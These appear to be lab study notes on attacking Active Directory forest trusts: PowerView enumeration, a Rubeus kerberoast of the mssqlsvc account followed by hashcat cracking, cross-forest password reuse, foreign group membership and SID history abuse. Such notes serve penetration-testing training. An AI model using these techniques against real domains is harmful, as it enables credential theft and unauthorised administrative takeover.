#### Enumerating the mssqlsvc Account
```python
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```

```python
PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
- Now, we'll get the hash for the user mssqlsvc and then we can try cracking it with hashcat
## Admin Password Re-Use & Group Membership
- Sometimes in bidirectional forest trusts managed by the same company, if you compromise Domain A and grab cleartext passwords or NT hashes for a privileged account, it's worth checking if Domain B has an account with the same (or similar) name reusing the same password. For example, `adm_bob.smith` in Domain A's Domain Admins might share a password with `bsmith_admin` in Domain B, instantly giving you full admin rights across both forests.
- In bidirectional forest trusts, admins from Domain A can be members of Domain Local Groups in Domain B — sometimes even the built-in Administrators group. Compromising that user in Domain A can hand you full admin access to Domain B.

#### Using Get-DomainForeignGroupMember
```python
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```

## SID History Abuse - Cross Forest

- SID History exists to preserve access during migrations. If SID Filtering is off across a forest trust, an attacker can stuff a Domain Admin SID from Forest A into any account in Forest B — and that account silently gets Domain Admin rights in Forest A every time it authenticates across the trust.
